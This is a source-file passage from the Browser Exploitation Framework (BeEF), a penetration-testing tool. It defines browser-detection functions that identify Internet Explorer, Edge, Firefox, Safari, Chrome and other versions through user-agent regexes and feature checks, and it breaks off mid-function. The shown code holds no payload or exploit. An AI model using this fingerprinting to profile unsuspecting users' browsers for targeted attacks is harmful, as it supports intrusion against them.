//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * @literal object: beef.browser
 *
 * Basic browser functions.
 */
beef.browser = {

    /**
     * Returns the user agent that the browser is claiming to be.
     * @example: beef.browser.getBrowserReportedName()
     */
    getBrowserReportedName: function () {
        return navigator.userAgent;
    },

    /**
     * Returns true if Avant Browser.
     * @example: beef.browser.isA()
     */
    isA: function () {
        return window.navigator.userAgent.match(/Avant TriCore/) != null;
    },

    /**
     * Returns true if Iceweasel.
     * @example: beef.browser.isIceweasel()
     */
    isIceweasel: function () {
        return window.navigator.userAgent.match(/Iceweasel\/\d+\.\d/) != null;
    },

    /**
     * Returns true if Midori.
     * @example: beef.browser.isMidori()
     */
    isMidori: function () {
        return window.navigator.userAgent.match(/Midori\/\d+\.\d/) != null;
    },

    /**
     * Returns true if Odyssey
     * @example: beef.browser.isOdyssey()
     */
    isOdyssey: function () {
        return (window.navigator.userAgent.match(/Odyssey Web Browser/) != null && window.navigator.userAgent.match(/OWB\/\d+\.\d/) != null);
    },

    /**
     * Returns true if Brave
     * @example: beef.browser.isBrave()
     */
    isBrave: function(){
        return (window.navigator.userAgent.match(/brave\/\d+\.\d/) != null && window.navigator.userAgent.match(/Brave\/\d+\.\d/) != null);
    },

    /**
     * Returns true if IE6.
     * @example: beef.browser.isIE6()
     */
    isIE6: function () {
        return !window.XMLHttpRequest && !window.globalStorage;
    },

    /**
     * Returns true if IE7.
     * @example: beef.browser.isIE7()
     */
    isIE7: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !window.getComputedStyle && !window.globalStorage && !document.documentMode;
    },

    /**
     * Returns true if IE8.
     * @example: beef.browser.isIE8()
     */
    isIE8: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !window.performance;
    },

    /**
     * Returns true if IE9.
     * @example: beef.browser.isIE9()
     */
    isIE9: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints === "undefined";
    },

    /**
     *
     * Returns true if IE10.
     * @example: beef.browser.isIE10()
     */
    isIE10: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined";
    },

    /**
     *
     * Returns true if IE11.
     * @example: beef.browser.isIE11()
     */
    isIE11: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined" && typeof document.selection === "undefined" && typeof document.createStyleSheet === "undefined" && typeof window.createPopup === "undefined" && typeof window.XDomainRequest === "undefined";
    },

    /**
     *
     * Returns true if Edge.
     * @example: beef.browser.isEdge()
     */
    isEdge: function () {
        return !beef.browser.isIE() && !!window.StyleMedia;
    },

    /**
     * Returns true if IE.
     * @example: beef.browser.isIE()
     */
    isIE: function () {
        return this.isIE6() || this.isIE7() || this.isIE8() || this.isIE9() || this.isIE10() || this.isIE11();
    },

    /**
     * Returns true if FF2.
     * @example: beef.browser.isFF2()
     */
    isFF2: function () {
        return !!window.globalStorage && !window.postMessage;
    },

    /**
     * Returns true if FF3.
     * @example: beef.browser.isFF3()
     */
    isFF3: function () {
        return !!window.globalStorage && !!window.postMessage && !JSON.parse;
    },

    /**
     * Returns true if FF3.5.
     * @example: beef.browser.isFF3_5()
     */
    isFF3_5: function () {
        return !!window.globalStorage && !!JSON.parse && !window.FileReader;
    },

    /**
     * Returns true if FF3.6.
     * @example: beef.browser.isFF3_6()
     */
    isFF3_6: function () {
        return !!window.globalStorage && !!window.FileReader && !window.multitouchData && !window.history.replaceState;
    },

    /**
     * Returns true if FF4.
     * @example: beef.browser.isFF4()
     */
    isFF4: function () {
        return !!window.globalStorage && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/4\./) != null;
    },

    /**
     * Returns true if FF5.
     * @example: beef.browser.isFF5()
     */
    isFF5: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/5\./) != null;
    },

    /**
     * Returns true if FF6.
     * @example: beef.browser.isFF6()
     */
    isFF6: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/6\./) != null;
    },

    /**
     * Returns true if FF7.
     * @example: beef.browser.isFF7()
     */
    isFF7: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/7\./) != null;
    },

    /**
     * Returns true if FF8.
     * @example: beef.browser.isFF8()
     */
    isFF8: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/8\./) != null;
    },

    /**
     * Returns true if FF9.
     * @example: beef.browser.isFF9()
     */
    isFF9: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/9\./) != null;
    },

    /**
     * Returns true if FF10.
     * @example: beef.browser.isFF10()
     */
    isFF10: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/10\./) != null;
    },

    /**
     * Returns true if FF11.
     * @example: beef.browser.isFF11()
     */
    isFF11: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/11\./) != null;
    },

    /**
     * Returns true if FF12
     * @example: beef.browser.isFF12()
     */
    isFF12: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/12\./) != null;
    },

    /**
     * Returns true if FF13
     * @example: beef.browser.isFF13()
     */
    isFF13: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/13\./) != null;
    },

    /**
     * Returns true if FF14
     * @example: beef.browser.isFF14()
     */
    isFF14: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/14\./) != null;
    },

    /**
     * Returns true if FF15
     * @example: beef.browser.isFF15()
     */
    isFF15: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/15\./) != null;
    },

    /**
     * Returns true if FF16
     * @example: beef.browser.isFF16()
     */
    isFF16: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/16\./) != null;
    },

    /**
     * Returns true if FF17
     * @example: beef.browser.isFF17()
     */
    isFF17: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/17\./) != null;
    },

    /**
     * Returns true if FF18
     * @example: beef.browser.isFF18()
     */
    isFF18: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/18\./) != null;
    },

    /**
     * Returns true if FF19
     * @example: beef.browser.isFF19()
     */
    isFF19: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/19\./) != null;
    },

    /**
     * Returns true if FF20
     * @example: beef.browser.isFF20()
     */
    isFF20: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/20\./) != null;
    },

    /**
     * Returns true if FF21
     * @example: beef.browser.isFF21()
     */
    isFF21: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/21\./) != null;
    },

    /**
     * Returns true if FF22
     * @example: beef.browser.isFF22()
     */
    isFF22: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/22\./) != null;
    },

    /**
     * Returns true if FF23
     * @example: beef.browser.isFF23()
     */
    isFF23: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/23\./) != null;
    },

    /**
     * Returns true if FF24
     * @example: beef.browser.isFF24()
     */
    isFF24: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/24\./) != null;
    },

    /**
     * Returns true if FF25
     * @example: beef.browser.isFF25()
     */
    isFF25: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/25\./) != null;
    },

    /**
     * Returns true if FF26
     * @example: beef.browser.isFF26()
     */
    isFF26: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/26./) != null;
    },

    /**
     * Returns true if FF27
     * @example: beef.browser.isFF27()
     */
    isFF27: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && window.navigator.userAgent.match(/Firefox\/27./) != null;
    },

    /**
     * Returns true if FF28
     * @example: beef.browser.isFF28()
     */
    isFF28: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt !== 'function' && window.navigator.userAgent.match(/Firefox\/28./) != null;
    },

    /**
     * Returns true if FF29
     * @example: beef.browser.isFF29()
     */
    isFF29: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/29./) != null;
    },

    /**
     * Returns true if FF30
     * @example: beef.browser.isFF30()
     */
    isFF30: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/30./) != null;
    },

    /**
     * Returns true if FF31
     * @example: beef.browser.isFF31()
     */
    isFF31: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/31./) != null;
    },

    /**
     * Returns true if FF32
     * @example: beef.browser.isFF32()
     */
    isFF32: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/32./) != null;
    },

    /**
     * Returns true if FF33
     * @example: beef.browser.isFF33()
     */
    isFF33: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/33./) != null;
    },

    /**
     * Returns true if FF34
     * @example: beef.browser.isFF34()
     */
    isFF34: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/34./) != null;
    },

    /**
     * Returns true if FF35
     * @example: beef.browser.isFF35()
     */
    isFF35: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/35./) != null;
    },

    /**
     * Returns true if FF36
     * @example: beef.browser.isFF36()
     */
    isFF36: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/36./) != null;
    },

    /**
     * Returns true if FF37
     * @example: beef.browser.isFF37()
     */
    isFF37: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/37./) != null;
    },

    /**
     * Returns true if FF38
     * @example: beef.browser.isFF38()
     */
    isFF38: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/38./) != null;
    },

    /**
     * Returns true if FF39
     * @example: beef.browser.isFF39()
     */
    isFF39: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/39./) != null;
    },

    /**
     * Returns true if FF40
     * @example: beef.browser.isFF40()
     */
    isFF40: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/40./) != null;
    },

    /**
     * Returns true if FF41
     * @example: beef.browser.isFF41()
     */
    isFF41: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/41./) != null;
    },

    /**
     * Returns true if FF42
     * @example: beef.browser.isFF42()
     */
    isFF42: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/42./) != null;
    },

    /**
     * Returns true if FF43
     * @example: beef.browser.isFF43()
     */
    isFF43: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/43./) != null;
    },

    /**
     * Returns true if FF44
     * @example: beef.browser.isFF44()
     */
    isFF44: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/44./) != null;
    },

    /**
     * Returns true if FF45
     * @example: beef.browser.isFF45()
     */
    isFF45: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/45./) != null;
    },

    /**
     * Returns true if FF46
     * @example: beef.browser.isFF46()
     */
    isFF46: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/46./) != null;
    },

    /**
     * Returns true if FF47
     * @example: beef.browser.isFF47()
     */
    isFF47: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/47./) != null;
    },

    /**
     * Returns true if FF48
     * @example: beef.browser.isFF48()
     */
    isFF48: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/48./) != null;
    },

    /**
     * Returns true if FF49
     * @example: beef.browser.isFF49()
     */
    isFF49: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/49./) != null;
    },

    /**
     * Returns true if FF50
     * @example: beef.browser.isFF50()
     */
    isFF50: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/50./) != null;
    },

    /**
     * Returns true if FF51
     * @example: beef.browser.isFF51()
     */
    isFF51: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/51./) != null;
    },

    /**
     * Returns true if FF52
     * @example: beef.browser.isFF52()
     */
    isFF52: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/52./) != null;
    },

    /**
     * Returns true if FF53
     * @example: beef.browser.isFF53()
     */
    isFF53: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/53./) != null;
    },

    /**
     * Returns true if FF54
     * @example: beef.browser.isFF54()
     */
    isFF54: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/54./) != null;
    },

    /**
     * Returns true if FF55
     * @example: beef.browser.isFF55()
     */
    isFF55: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/55./) != null;
    },

    /**
     * Returns true if FF56
     * @example: beef.browser.isFF56()
     */
    isFF56: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/56./) != null;
    },

    /**
     * Returns true if FF.
     * @example: beef.browser.isFF()
     */
    isFF: function () {
        return this.isFF2() || this.isFF3() || this.isFF3_5() || this.isFF3_6() || this.isFF4() || this.isFF5() || this.isFF6() || this.isFF7() || this.isFF8() || this.isFF9() || this.isFF10() || this.isFF11() || this.isFF12() || this.isFF13() || this.isFF14() || this.isFF15() || this.isFF16() || this.isFF17() || this.isFF18() || this.isFF19() || this.isFF20() || this.isFF21() || this.isFF22() || this.isFF23() || this.isFF24() || this.isFF25() || this.isFF26() || this.isFF27() || this.isFF28() || this.isFF29() || this.isFF30() || this.isFF31() || this.isFF32() || this.isFF33() || this.isFF34() || this.isFF35() || this.isFF36() || this.isFF37() || this.isFF38() || this.isFF39() || this.isFF40() || this.isFF41() || this.isFF42() || this.isFF43() || this.isFF44() || this.isFF45() || this.isFF46() || this.isFF47() || this.isFF48() || this.isFF49() || this.isFF50() || this.isFF51() || this.isFF52() || this.isFF53() || this.isFF54() || this.isFF55() || this.isFF56();
    },

    /**
     * Returns true if Safari 4.xx
     * @example: beef.browser.isS4()
     */
    isS4: function () {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/4/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 5.xx
     * @example: beef.browser.isS5()
     */
    isS5: function () {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/5/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 6.xx
     * @example: beef.browser.isS6()
     */
    isS6: function () {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/6/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 7.xx
     * @example: beef.browser.isS7()
     */
    isS7: function () {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/7/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 8.xx
     * @example: beef.browser.isS8()
     */
    isS8: function () {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/8/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari.
     * @example: beef.browser.isS()
     */
    isS: function () {
        return this.isS4() || this.isS5() || this.isS6() || this.isS7() || this.isS8();
    },

    /**
     * Returns true if Chrome 5.
     * @example: beef.browser.isC5()
     */
    isC5: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 5) ? true : false);
    },

    /**
     * Returns true if Chrome 6.
     * @example: beef.browser.isC6()
     */
    isC6: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 6) ? true : false);
    },

    /**
     * Returns true if Chrome 7.
     * @example: beef.browser.isC7()
     */
    isC7: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 7) ? true : false);
    },

    /**
     * Returns true if Chrome 8.
     * @example: beef.browser.isC8()
     */
    isC8: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 8) ? true : false);
    },

    /**
     * Returns true if Chrome 9.
     * @example: beef.browser.isC9()
     */
    isC9: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 9) ? true : false);
    },

    /**
     * Returns true if Chrome 10.
     * @example: beef.browser.isC10()
     */
    isC10: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 10) ? true : false);
    },

    /**
     * Returns true if Chrome 11.
     * @example: beef.browser.isC11()
     */
    isC11: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 11) ? true : false);
    },

    /**
     * Returns true if Chrome 12.
     * @example: beef.browser.isC12()
     */
    isC12: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 12) ? true : false);
    },

    /**
     * Returns true if Chrome 13.
     * @example: beef.browser.isC13()
     */
    isC13: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 13) ? true : false);
    },

    /**
     * Returns true if Chrome 14.
     * @example: beef.browser.isC14()
     */
    isC14: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 14) ? true : false);
    },

    /**
     * Returns true if Chrome 15.
     * @example: beef.browser.isC15()
     */
    isC15: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 15) ? true : false);
    },

    /**
     * Returns true if Chrome 16.
     * @example: beef.browser.isC16()
     */
    isC16: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 16) ? true : false);
    },

    /**
     * Returns true if Chrome 17.
     * @example: beef.browser.isC17()
     */
    isC17: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 17) ? true : false);
    },

    /**
     * Returns true if Chrome 18.
     * @example: beef.browser.isC18()
     */
    isC18: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 18) ? true : false);
    },

    /**
     * Returns true if Chrome 19.
     * @example: beef.browser.isC19()
     */
    isC19: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 19) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 19.
     * @example: beef.browser.isC19iOS()
     */
    isC19iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 19) ? true : false);
    },

    /**
     * Returns true if Chrome 20.
     * @example: beef.browser.isC20()
     */
    isC20: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 20) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 20.
     * @example: beef.browser.isC20iOS()
     */
    isC20iOS: function () {
